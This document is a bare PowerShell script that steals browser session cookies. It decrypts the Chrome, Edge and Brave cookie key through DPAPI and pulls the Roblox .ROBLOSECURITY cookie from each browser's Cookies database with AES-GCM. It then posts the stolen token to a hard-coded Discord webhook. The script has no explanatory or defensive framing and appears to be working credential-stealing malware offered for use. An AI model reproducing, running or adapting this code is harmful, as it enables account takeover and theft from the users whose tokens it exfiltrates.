$w='https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V'
Add-Type -AssemblyName System.Security
$b=@('Google\Chrome','Microsoft\Edge','BraveSoftware\Brave-Browser')
foreach($b in $b){
    $l="$env:LOCALAPPDATA\$b\User Data\Local State"
    if(Test-Path $l){
        $j=Get-Content $l|ConvertFrom-Json
        $e=$j.os_crypt.encrypted_key
        $k=[System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String($e)[5..10000],$null,'CurrentUser')
        $c="$env:LOCALAPPDATA\$b\User Data\Default\Network\Cookies"
        if(Test-Path $c){
            $t="$env:TEMP\c.db"
            Copy-Item $c $t -Force
            $conn=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$t")
            $conn.Open()
            $cmd=$conn.CreateCommand()
            $cmd.CommandText="SELECT encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'"
            $r=$cmd.ExecuteReader()
            while($r.Read()){
                $d=$r.GetValue(0)
                $n=$d[3..14]
                $cipher=$d[15..($d.Length-17)]
                $tag=$d[($d.Length-16)..($d.Length-1)]
                $aes=[System.Security.Cryptography.AesGcm]::new($k)
                $plain=[byte[]]::new($cipher.Length)
                $aes.Decrypt($n,$cipher,$tag,$plain)
                $token=[System.Text.Encoding]::UTF8.GetString($plain)
                if($token-match'_|WARNING'){
                    Invoke-RestMethod -Uri $w -Method Post -Body (@{content='TOKEN: '+$token}|ConvertTo-Json)-ContentType 'application/json'
                }
            }
        }
    }
}
